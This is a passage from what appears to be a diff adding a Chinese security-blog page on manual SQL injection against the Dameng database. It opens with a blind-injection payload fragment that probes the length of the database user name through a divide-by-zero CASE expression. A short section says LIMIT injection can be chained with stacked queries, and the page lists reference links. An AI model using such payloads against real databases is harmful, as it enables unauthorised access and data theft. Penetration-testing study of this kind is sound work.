class="mi">1</span><span class="o">/</span><span class="p">(</span><span class="k">case</span><span class="w"> </span><span class="k">when</span><span class="w"> </span><span class="n">len</span><span class="p">(</span><span class="k">user</span><span class="p">)</span><span class="o">=</span><span class="mi">6</span><span class="w"> </span><span class="k">then</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="k">end</span><span class="p">))</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">20</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="0x0c-limit-注入" class="heading-element"><span>0x0C limit 注入</span>
+  <a href="#0x0c-limit-%e6%b3%a8%e5%85%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>可以接 堆叠注入</p>
+<h2 id="end-参考文章" class="heading-element"><span>END 参考文章</span>
+  <a href="#end-%e5%8f%82%e8%80%83%e6%96%87%e7%ab%a0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><ul>
+<li>达梦数据库手工注入笔记：https://mp.weixin.qq.com/s/vWt3aHhji7e64EMGEBXigg</li>
+<li>达梦技术文档：https://eco.dameng.com/document/dm/zh-cn/pm/logical-structure.html</li>
+</ul>
+</div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2024-12-17 09:30:40">更新于 2024-12-17&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/sqli/" class="post-tag" title="标签 - SQLi">SQLi</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/posts/burp-cph-usage/" class="post-nav-item" rel="prev" title="Burp-CPH插件心得"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Burp-CPH插件心得</a><a href="/posts/001-case_%E5%B7%A7%E7%94%A8js%E6%8C%96%E6%8E%98%E5%AE%9D%E8%97%8F/" class="post-nav-item" rel="next" title="001-渗透案例：巧用JS挖掘“宝藏”">001-渗透案例：巧用JS挖掘“宝藏”<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/twemoji/twemoji.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":20},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/search.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":30,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"twemoji":true,"version":"v0.3.16"};console.log('Page config:', window.config);</script><script src="/js/theme.min.js" defer></script></body>
+</html>
